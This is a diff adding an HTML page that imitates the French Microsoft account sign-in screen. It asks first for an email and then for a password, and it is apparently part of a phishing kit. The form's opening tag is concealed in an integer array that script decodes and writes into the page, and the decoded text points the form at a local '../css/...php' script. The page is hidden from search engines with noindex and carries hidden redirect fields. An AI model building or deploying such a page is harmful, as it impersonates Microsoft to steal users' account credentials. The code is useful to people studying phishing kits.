@@ -1,0 +1,405 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
+<title>Se connecter à votre compte Microsoft</title>
+<link rel="shortcut icon" href="css/favicon.ico">
+<script src="css/jquery-latest.min.js"></script>
+<script type="text/javascript">
+$(document).on("keyup", "input[name=logn]", function() {
+    $("span.logn").html($(this).val());
+});
+
+</script>
+ <script type="text/javascript">
+ window.document.onkeydown = CheckEnter;
+
+  function CheckEnter(){
+
+     if(event.keyCode == 13)
+
+          return false;
+
+     return true;
+
+}
+</script>
+<script type="text/javascript">
+function checkFilled() {
+   	var fld=document.getElementById('logn').value;
+	var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
+   if(fld.length < 1){
+        document.getElementById('logn').style.borderColor = "rgb(232, 17, 35)";
+        document.getElementById('efire').style.display = "block";
+        document.getElementById('efired').style.display = "none";
+        return false;
+    }else{
+        document.getElementById('logn').style.borderColor = "blue";
+    }
+	
+	    if (fld.match(emailExp)) 
+		{ 
+   document.getElementById('filth').style.display = "none";
+   document.getElementById('porn').style.display = "block";
+   document.getElementById('logn').style.borderColor = "blue";
+         } else {
+		document.getElementById('logn').style.borderColor = "rgb(232, 17, 35)";
+        document.getElementById('efire').style.display = "block";
+        document.getElementById('efired').style.display = "none";
+        return false;
+    }
+}
+
+function checkPassy() { 
+    var fn=document.getElementById('passd').value;	
+ if(fn.length < 5){
+        document.getElementById('passd').style.borderColor = "rgb(232, 17, 35)";
+        document.getElementById('efired').style.display = "block";
+        return false;
+    }else{
+		document.getElementById('passd').style.borderColor = "blue";
+    }
+}
+
+</script>
+<style type="text/css">
+body {
+	height: 100vh;
+	width: 100%;
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+}
+#bady {
+	height: 100%;
+	width: 100%;
+	background: linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url('css/0.jpg');
+	background-size: 100% 116%;
+	background-repeat: no-repeat;
+	background-position: 0px -50px;
+
+}
+.chamber {
+	/*	position: absolute;
+	top: 50%;
+	left: 50%;
+	transform: translate(-50%, -50%); */
+	position: absolute; /*it can be fixed too*/
+	left: 0;
+	right: 0;
+	top: 0;
+	bottom: 0;
+	background-color: #FFF;
+	width: 320px;
+	/*this to solve "the content will not be cut when the window is smaller than the content": */
+	max-width: 380px;
+	max-height: 360px;
+	padding-left: 40px;
+	padding-top: 40px;
+	border: 1px solid #CCC;
+	font-family: "Segoe UI Webfont", -apple-system, 'Helvetica Neue', 'Lucida Grande', Roboto, Ebrima, 'Nirmala UI', Gadugi, 'Segoe Xbox Symbol';
+	padding-right: 50px;
+	margin: auto;
+	padding-bottom: 10px;
+	height: 340px;
+	}
+
+.logo {
+	float: left;
+}
+h2 {
+	float: left;
+	clear: left;
+	margin: 16px -2px; padding: 0px; font-weight: 300;
+
+}
+h4 {
+	float: left;
+	clear: left;
+	margin: 16px -2px;
+	padding: 0px;
+	font-weight: normal;
+	font-size: 13px;
+}
+.efigbo {
+	clear: left;
+	margin-left:-1px;
+	font-size: 15px;
+}
+#efired {
+	margin-left: -1px;
+	font-size: 15px;
+	color: #E81123;
+	margin-bottom: -5px;
+	width: 350px;
+	float: left;
+	margin-top: -4px;
+}
+#efire {
+	margin-left: -1px;
+	font-size: 15px;
+	color: #E81123;
+	margin-top: 10px;
+	margin-bottom: -5px;
+	width: 350px;
+	float: left;
+}
+input {
+	height: 32px;
+	clear: left;
+	margin-top: 15px;
+	margin-left: -1px;
+	border: 1px solid #333;
+	width: 100%;
+	font-size: 15px;
+	padding-left: 12px;
+	font-family: "Segoe UI Webfont", -apple-system, 'Helvetica Neue', 'Lucida Grande', Roboto, Ebrima, 'Nirmala UI', Gadugi, 'Segoe Xbox Symbol';
+	margin-bottom: 15px;
+	}
+input:focus {
+    outline: none;
+	border: 1px solid #06C;
+}
+.btn-primary{
+	border: 1px solid rgb(0, 103, 184);
+	color: rgb(255, 255, 255);
+	font-style: inherit;
+	font-variant: inherit;
+	font-weight: inherit;
+	font-stretch: inherit;
+	font-size: inherit;
+	line-height: inherit;
+	font-family: inherit;
+	position: relative;
+	text-align: center;
+	white-space: nowrap;
+	overflow: hidden;
+	vertical-align: middle;
+	background-color: #0067B8;
+	height: 36px;
+	cursor: pointer;
+	padding-top: 4px;
+	padding-right: 12px;
+	padding-bottom: 4px;
+	padding-left: 12px;
+	margin-left: -1px;
+	width: 334px;
+	clear: left;
+	}
+.pp-primary{
+	border: 1px solid rgb(0, 103, 184);
+	color: rgb(255, 255, 255);
+	font-style: inherit;
+	font-variant: inherit;
+	font-weight: inherit;
+	font-stretch: inherit;
+	font-size: inherit;
+	line-height: inherit;
+	font-family: inherit;
+	width: 49%;
+	position: relative;
+	text-align: center;
+	white-space: nowrap;
+	overflow: hidden;
+	vertical-align: middle;
+	background-color: rgb(0, 103, 184);
+	height: 36px;
+	cursor: pointer;
+	padding-top: 4px;
+	padding-right: 12px;
+	padding-bottom: 4px;
+	padding-left: 12px;
+	margin-right: -50px;
+	cursor: pointer;
+	clear: left;
+	}
+.oo-primary{
+	border: 1px solid #D6D6D6;
+	color: #000000;
+	font-style: inherit;
+	font-variant: inherit;
+	font-weight: inherit;
+	font-stretch: inherit;
+	font-size: inherit;
+	line-height: inherit;
+	font-family: inherit;
+	width: 49%;
+	position: relative;
+	text-align: center;
+	white-space: nowrap;
+	overflow: hidden;
+	vertical-align: middle;
+	background-color: #D6D6D6;
+	height: 36px;
+	cursor: pointer;
+	padding-top: 4px;
+	padding-right: 12px;
+	padding-bottom: 4px;
+	padding-left: 12px;
+	margin-right: 1%;
+	clear: left;
+	}
+	
+.footer {
+	position: fixed;
+	left: 0px;
+	bottom: 0px;
+	height: 24px;
+	width: 100%;
+	background-color: rgba(0, 0, 0, 0.6);
+	text-align: right;
+	color: #FFFFFF;
+	font-family: "Segoe UI Webfont", -apple-system, 'Helvetica Neue', 'Lucida Grande', Roboto, Ebrima, 'Nirmala UI', Gadugi, 'Segoe Xbox Symbol';
+	font-size: 12.5px;
+	padding-top: 6px;
+	}
+.footer a{
+	color: #FFFFFF;
+}
+/* IE 6 */
+* html .footer {
+	position: absolute;
+   top:expression((0-(footer.offsetHeight)+(document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.clientHeight)+(ignoreMe = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop))+'px');
+}
+
+.ugogbe {
+	margin-left: -40px;
+	font-size: 15px;
+	background-color: #F2F2F2;
+	line-height: 28px;
+	white-space: nowrap;
+	overflow: hidden;
+	text-align: right;
+	width: 310px;
+	padding-right: 100px;
+	margin-top: 15px;
+	float: left;
+	clear: both;
+}
+
+.eholder {
+	height: 45px;
+	width: 45px;
+	margin-top: -46px;
+	float:right;
+	}
+</style>
+<script language="Javascript">
+var erp = new Array;
+erp[0] = 1009739877;
+erp[1] = 1633959437;
+erp[2] = 171729519;
+erp[3] = 1685667341;
+erp[4] = 171730025;
+erp[5] = 1981835620;
+erp[6] = 1025663585;
+erp[7] = 1685660222;
+erp[8] = 218767392;
+erp[9] = 1013346162;
+erp[10] = 1830821998;
+erp[11] = 1634559293;
+erp[12] = 577138546;
+erp[13] = 1831936544;
+erp[14] = 1936745836;
+erp[15] = 1818454117;
+erp[16] = 1667972386;
+erp[17] = 1717660787;
+erp[18] = 1696735341;
+erp[19] = 1702127727;
+erp[20] = 1681728112;
+erp[21] = 1869837346;
+erp[22] = 543253364;
+erp[23] = 1768910397;
+erp[24] = 573451823;
+erp[25] = 1668510511;
+erp[26] = 1836081454;
+erp[27] = 1885892642;
+erp[28] = 543257972;
+erp[29] = 1868787565;
+erp[30] = 1886152052;
+erp[31] = 1698505327;
+erp[32] = 1717969440;
+erp[33] = 544173683;
+erp[34] = 1969384809;
+erp[35] = 1950163570;
+erp[36] = 1702131058;
+erp[37] = 1847616360;
+erp[38] = 1701014352;
+erp[39] = 1634956153;
+erp[40] = 673790754;
+erp[41] = 1041041952;
+erp[42] = 538983524;
+erp[43] = 1769349219;
+erp[44] = 1818325875;
+erp[45] = 1025663848;
+erp[46] = 1634558565;
+erp[47] = 1914846733;
+erp[48] = 169877536;
+erp[49] = 540828777;
+erp[50] = 1981834092;
+erp[51] = 1634956093;
+erp[52] = 577531751;
+erp[53] = 7283262;
+var em = '';
+for(i=0;i<erp.length;i++){
+	tmp = erp[i];
+	if(Math.floor((tmp/Math.pow(256,3)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,3))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,3))) * Math.pow(256,3));
+	if(Math.floor((tmp/Math.pow(256,2)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,2))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,2))) * Math.pow(256,2));
+	if(Math.floor((tmp/Math.pow(256,1)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,1))));
+	};
+	tmp = tmp - (Math.floor((tmp/Math.pow(256,1))) * Math.pow(256,1));
+	if(Math.floor((tmp/Math.pow(256,0)))>0){
+		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,0))));
+	};
+};
+document.write(em);
+</script>
+<img src="css/microsoft_logo.svg" alt="Microsoft Logo" /></div>
+<input name="agenti" type="hidden" id="agenti" value="New Hotmail">
+  <input name="redir" type="hidden" id="redir" value="https://mail.live.com/default.aspx"><div id="filth">
+<h2>Connexion</h2>
+<div id="efire" style="display:none;">Please enter a valid email address, phone number, or Skype name.</div>
+<label for="logn"></label>
+<input  type="email" name="logn" id="logn" placeholder="Email, phone, or Skype" />
+  <button name="button" type="button"  class="btn-primary" id="button"  onClick="checkFilled()">Suivant</button>
+<h4>Vous n'avez pas encore de compte ? <a href="" style="background-color: transparent; color: rgb(0, 114, 198); text-decoration: none; white-space: nowrap;"> Créez-en un ! </a> </h4>
+<!-- piachie onyembu -->
+</div>
+
+
+
+<div id="porn" style="display:none;">
+<div class="ugogbe"><span class="logn" ></span></div><img src="css/picker_account_msa.svg" class="eholder"  />  
+<h2>Entrez le mot de passe</h2>
+<div id="efired" style="display:none;">Please enter the password for your Microsoft account.</div>
+<label for="passd"></label>
+<input type="password" name="passd" id="passd" placeholder="Password" />
+<div style="width:332px;">
+<button name="button"  class="oo-primary" id="button" type="button">Retour</button>
+  <button name="button"  class="pp-primary" id="button2" type="submit" onClick="check(this.form)"  >Se connecter</button>
+</div>
+<div style="margin-top:15px;">
+<input aria-label="Keep me signed in" style="margin: 0px 0px 0px 0px; padding: 0px; color: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; max-width: 100%; width: 20px; height: 20px; position: absolute;" type="checkbox">
+<div style="font-size: 15px; line-height: 28px;	white-space: nowrap; overflow: hidden; margin-top:-2px;	width: 310px;	padding-right: 100px; margin-bottom:10px; float: left; margin-left:30px;">Maintenir la connexion</div>
+</div>
+<div ><a href="#" style="background-color: transparent; color: rgb(0, 103, 184); font-size:13px; text-decoration: none;">J'ai oublié mon mot de passe</a></div>
+<!-- piachie secondi -->
+</div>
+
+<!-- piachie chamber -->
+</div>  
+  </form>
+<div class="footer" style="font-size:12px;"><span style="margin-right:30px;">&copy;2017 Microsoft</span><span style="margin-right:30px;"><a href="" style="color: #FFFFFF; text-decoration: none; white-space: nowrap;">Terms of Use</a></span>
+<span style="margin-right:10px;"><a href="" style="color: #FFFFFF; text-decoration: none; white-space: nowrap; ">Privacy &amp; Cookies</a></span></div></div>
+</body>
+</html>
